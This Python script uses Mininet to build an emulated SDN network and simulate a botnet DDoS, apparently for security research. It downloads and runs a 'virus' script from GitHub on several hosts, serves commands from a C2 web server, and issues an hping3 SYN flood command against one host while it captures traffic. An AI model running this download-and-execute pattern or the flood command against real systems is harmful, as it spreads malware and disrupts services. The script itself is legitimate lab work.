import time
from subprocess import Popen

from mininet.net import Mininet
from mininet.node import OVSController
from mininet.log import setLogLevel


def create_network():
    # Ensure that the network is clean
    Popen("mn -c", shell=True).wait()

    # Ensure required packages are installed
    Popen("apt-get update && apt-get install -y bwm-ng tcpdump hping3", shell=True).wait()

    # Create a network
    net = Mininet(controller=OVSController)

    # Add a controller
    net.addController('c0')

    # Add switches
    s1 = net.addSwitch('s1')
    s2 = net.addSwitch('s2')
    s3 = net.addSwitch('s3')

    # Add hosts and links to s1
    h1 = net.addHost('h1', ip='10.42.0.1')
    h2 = net.addHost('h2', ip='10.42.0.2')
    net.addLink(h1, s1, bw=200)
    net.addLink(h2, s1, bw=100)

    # Add hosts and links to s2
    h3 = net.addHost('h3', ip='10.42.0.3')
    h4 = net.addHost('h4', ip='10.42.0.4')
    net.addLink(h3, s2, bw=100)
    net.addLink(h4, s2, bw=100)

    # Add hosts and links to s3
    h5 = net.addHost('h5', ip='10.42.0.5')
    h6 = net.addHost('h6', ip='10.42.0.6')
    net.addLink(h5, s3, bw=100)
    net.addLink(h6, s3, bw=100)

    # Add links between switches
    net.addLink(s1, s2, bw=1000)
    net.addLink(s2, s3, bw=1000)

    # Start the network
    net.start()

    # Install a simple webserver on h5 (attacker node (C2 Server))
    h5.cmd('apt-get update && apt-get install -y apache2')
    h5.cmd('service apache2 start')
    # Create a command file
    h5.cmd('echo "ls" > /var/www/html/command')

    # Simulate Infection
    for host in [h2, h4, h5]:
        host.cmd('wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py -O virus.py')
        host.cmd('python virus.py &')

    # Start Monitoring
    Popen("rm /tmp/mon.csv", shell=True).wait()
    Popen("bwm-ng -o csv -T rate -C ',' > /tmp/mon.csv &", shell=True).wait()

    # Start Capturing
    for i in range(1, 4):
        for j in range(1, 3):
            Popen(f"rm /tmp/s{i}-eth{j}.pcap", shell=True).wait()
            Popen(f"tcpdump -i s{i}-eth{j} -w /tmp/s{i}-eth{j}.pcap &", shell=True).wait()

    net.pingAll()

    # Wait for the network to stabilize
    time.sleep(10)

    # Start the attack
    h5.cmd('echo "hping3 -S --flood -V -p 80 10.42.0.1" > /var/www/html/command')

    # ping h3 to h1 continuously until a key is pressed
    try:
        while True:
            net.ping([h3, h1])
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    print("Stopping the attack...")

    for host in [h2, h4, h5]:
        host.cmd('killall python')

    # Wait for the network to stabilize
    time.sleep(10)

    print("Stopping the monitoring...")

    # Stop the capturing
    Popen("killall tcpdump", shell=True).wait()
    # Stop the monitoring
    Popen("killall bwm-ng", shell=True).wait()

    print("Stopping the network...")

    # Stop the network
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    create_network()